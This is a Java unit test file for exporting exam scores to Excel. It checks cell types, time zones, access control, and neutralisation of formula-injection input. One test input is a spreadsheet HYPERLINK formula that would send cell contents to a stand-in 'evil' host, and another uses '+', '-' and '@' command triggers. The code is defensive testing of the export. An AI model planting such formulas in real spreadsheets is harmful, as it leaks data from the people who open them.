package com.sep.vox.application.usecase.examgrading;

import static org.assertj.core.api.Assertions.assertThat;
import static org.assertj.core.api.Assertions.assertThatThrownBy;
import static org.mockito.ArgumentMatchers.any;
import static org.mockito.Mockito.doThrow;
import static org.mockito.Mockito.mock;
import static org.mockito.Mockito.never;
import static org.mockito.Mockito.verify;
import static org.mockito.Mockito.when;

import java.io.ByteArrayInputStream;
import java.io.IOException;
import java.math.BigDecimal;
import java.time.Instant;
import java.time.LocalDateTime;
import java.time.OffsetDateTime;
import java.util.List;
import java.util.UUID;
import java.util.stream.IntStream;

import org.apache.poi.ss.usermodel.CellType;
import org.apache.poi.ss.usermodel.Row;
import org.apache.poi.ss.usermodel.Sheet;
import org.apache.poi.ss.usermodel.WorkbookFactory;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.Test;
import org.mockito.ArgumentCaptor;

import com.sep.vox.application.exception.ForbiddenException;
import com.sep.vox.application.mapper.examgrading.GradingResultCode;
import com.sep.vox.application.port.input.query.ExportExamScoresQuery;
import com.sep.vox.application.port.input.service.ExamGradingAccessService;
import com.sep.vox.application.port.input.service.ExamScoreExportSupport;
import com.sep.vox.application.port.input.usecase.examgrading.ExportExamScoresExcelUseCase;
import com.sep.vox.application.query.dto.ExamScoreRowInfo;
import com.sep.vox.application.query.dto.GradingAssignmentFilter;
import com.sep.vox.application.query.repository.ExamGradingQueryRepository;

/**
 * Bản .xlsx bỏ được BOM và quote của CSV, nhưng KHÔNG bỏ được guard công thức: rủi ro nằm
 * ở lúc Excel đọc ô chứ không ở cách file được mã hoá. Lý do tồn tại của bản Excel là các ô
 * có KIỂU thật — nên "điểm là ô số", "thời gian là ô ngày" chính là thứ phải test.
 *
 * <p>Đọc ngược file bằng POI thay vì so chuỗi: .xlsx là một file zip, so byte không nói
 * được gì về thứ người dùng nhìn thấy.
 */
class ExportExamScoresExcelUseCaseTests {

    private ExamGradingQueryRepository examGradingQueryRepository;
    private ExamGradingAccessService examGradingAccessService;
    private ExportExamScoresExcelUseCase useCase;

    private final UUID adminId = UUID.randomUUID();
    private final UUID schoolId = UUID.randomUUID();
    private final UUID examId = UUID.randomUUID();
    private final UUID candidateResultId = UUID.randomUUID();

    @BeforeEach
    void setUp() {
        examGradingQueryRepository = mock(ExamGradingQueryRepository.class);
        examGradingAccessService = mock(ExamGradingAccessService.class);
        useCase = new ExportExamScoresExcelUseCase(
            new ExamScoreExportSupport(examGradingQueryRepository, examGradingAccessService));

        when(examGradingAccessService.requireActiveUserId()).thenReturn(adminId);
        when(examGradingAccessService.requireCurrentSchoolId(adminId)).thenReturn(schoolId);
        when(examGradingQueryRepository.findScoreRows(any())).thenReturn(List.of());
    }

    private void givenRow(String studentName, BigDecimal totalScore, Instant releasedAt) {
        when(examGradingQueryRepository.findScoreRows(any())).thenReturn(List.of(
            new ExamScoreRowInfo(candidateResultId, studentName, "hs@example.com", "12A1",
                "IELTS Mock", OffsetDateTime.parse("2026-07-12T08:00:00+07:00").toInstant(),
                totalScore, "B2", "RELEASED", "INITIAL", "UPHELD", "Cô Lan", releasedAt)));
    }

    private Sheet export() {
        return sheetOf(useCase.execute(ExportExamScoresQuery.scopedTo(examId, null, null)));
    }

    private Sheet sheetOf(byte[] bytes) {
        try (var workbook = WorkbookFactory.create(new ByteArrayInputStream(bytes))) {
            // Workbook đóng lại sau khi ra khỏi try, nên đọc hết sheet vào bộ nhớ trước là
            // không khả thi — POI cho phép giữ tham chiếu sheet của workbook đã đóng khi
            // dữ liệu đã nạp xong, và mọi assertion dưới đây chỉ đọc giá trị ô.
            return workbook.getSheetAt(0);
        } catch (IOException exception) {
            throw new IllegalStateException("Không đọc lại được file xuất ra", exception);
        }
    }

    private GradingAssignmentFilter capturedFilter() {
        var captor = ArgumentCaptor.forClass(GradingAssignmentFilter.class);
        verify(examGradingQueryRepository).findScoreRows(captor.capture());
        return captor.getValue();
    }

    @Test
    void should_write_the_thirteen_vietnamese_headers_in_order() {
        var header = export().getRow(0);

        assertThat(header.getLastCellNum()).isEqualTo((short) 13);
        assertThat(cellTexts(header)).containsExactly(
            "Mã bài", "Họ tên", "Email", "Lớp", "Kỳ thi", "Ca thi", "Điểm", "Xếp loại",
            "Trạng thái", "Vòng chấm cuối", "Kết luận", "Người chấm", "Thời điểm công bố");
    }

    private List<String> cellTexts(Row row) {
        return IntStream.range(0, row.getLastCellNum())
            .mapToObj(index -> row.getCell(index).getStringCellValue())
            .toList();
    }

    /** Lý do bản Excel tồn tại: cột này phải sort và tính trung bình được. */
    @Test
    void should_write_the_score_as_a_real_number_cell() {
        givenRow("Nguyễn Văn A", new BigDecimal("7.50"), null);

        var cell = export().getRow(1).getCell(6);

        assertThat(cell.getCellType()).isEqualTo(CellType.NUMERIC);
        assertThat(cell.getNumericCellValue()).isEqualTo(7.5);
    }

    /** Chưa có điểm phải là ô TRỐNG — ghi 0 là biến "chưa chấm" thành "được 0 điểm". */
    @Test
    void should_leave_the_score_blank_when_it_is_missing() {
        givenRow("Nguyễn Văn A", null, null);

        assertThat(export().getRow(1).getCell(6).getCellType()).isEqualTo(CellType.BLANK);
    }

    @Test
    void should_write_the_sitting_time_as_a_date_cell_in_vietnam_time() {
        givenRow("Nguyễn Văn A", new BigDecimal("7.50"), null);

        var cell = export().getRow(1).getCell(5);

        assertThat(cell.getCellType()).isEqualTo(CellType.NUMERIC);
        // Nguồn là 08:00+07:00; đọc ra phải là 08:00 bất kể JVM chạy ở múi giờ nào.
        assertThat(cell.getLocalDateTimeCellValue())
            .isEqualTo(LocalDateTime.of(2026, 7, 12, 8, 0));
    }

    @Test
    void should_write_the_release_time_in_vietnam_time_too() {
        givenRow("Nguyễn Văn A", new BigDecimal("7.50"),
            OffsetDateTime.parse("2026-07-20T03:30:00Z").toInstant());

        assertThat(export().getRow(1).getCell(12).getLocalDateTimeCellValue())
            .isEqualTo(LocalDateTime.of(2026, 7, 20, 10, 30));
    }

    @Test
    void should_neutralize_a_cell_that_starts_like_a_formula() {
        givenRow("=HYPERLINK(\"http://evil/?x=\"&A1,\"Nhấn vào đây\")", null, null);

        // Dấu nháy đơn phía trước là thứ ngăn Excel CHẠY ô này lúc mở file.
        assertThat(export().getRow(1).getCell(1).getStringCellValue()).startsWith("'=HYPERLINK(");
    }

    @Test
    void should_neutralize_the_other_formula_triggers_too() {
        for (var trigger : List.of("+", "-", "@")) {
            givenRow(trigger + "cmd", null, null);

            assertThat(export().getRow(1).getCell(1).getStringCellValue())
                .isEqualTo("'" + trigger + "cmd");
        }
    }

    @Test
    void should_leave_an_ordinary_name_untouched() {
        givenRow("Nguyễn Văn A", null, null);

        assertThat(export().getRow(1).getCell(1).getStringCellValue()).isEqualTo("Nguyễn Văn A");
    }

    @Test
    void should_write_the_short_result_code() {
        givenRow("Nguyễn Văn A", null, null);

        assertThat(export().getRow(1).getCell(0).getStringCellValue())
            .isEqualTo(GradingResultCode.of(candidateResultId));
    }

    @Test
    void should_produce_a_header_only_sheet_when_there_is_no_result() {
        assertThat(export().getLastRowNum()).isZero();
    }

    @Test
    void should_require_an_exam_or_a_schedule_scope() {
        assertThatThrownBy(() -> useCase.execute(ExportExamScoresQuery.scopedTo(null, null, null)))
            .isInstanceOf(IllegalArgumentException.class)
            .hasMessageContaining("kỳ thi hoặc ca thi");

        verify(examGradingQueryRepository, never()).findScoreRows(any());
    }

    @Test
    void should_reject_a_caller_without_access_to_the_exam() {
        doThrow(new ForbiddenException("BẢO MẬT: Bạn không có quyền thao tác trên bài kiểm tra này."))
            .when(examGradingAccessService)
            .authorizeSchoolAdminOrClassTestChair(schoolId, examId, adminId);

        assertThatThrownBy(() -> useCase.execute(ExportExamScoresQuery.scopedTo(examId, null, null)))
            .isInstanceOf(ForbiddenException.class);

        verify(examGradingQueryRepository, never()).findScoreRows(any());
    }

    @Test
    void should_pass_the_class_test_kind_through() {
        useCase.execute(ExportExamScoresQuery.scopedTo(examId, null, "CLASS_TEST"));

        assertThat(capturedFilter().examKind()).isEqualTo("CLASS_TEST");
    }

    @Test
    void should_default_the_exam_kind_to_centralized() {
        useCase.execute(ExportExamScoresQuery.scopedTo(examId, null, null));

        assertThat(capturedFilter().examKind()).isEqualTo("CENTRALIZED");
    }

    @Test
    void should_name_the_file_after_the_exam_kind() {
        assertThat(useCase.exportFileName("CLASS_TEST"))
            .startsWith("bang-diem-lop-").endsWith(".xlsx");
        assertThat(useCase.exportFileName("CENTRALIZED"))
            .startsWith("bang-diem-tap-trung-").endsWith(".xlsx");
        // Tên file đi vào header HTTP: phải là ASCII thuần, không dấu.
        assertThat(useCase.exportFileName(null)).matches("[\\x20-\\x7E]+");
    }
}
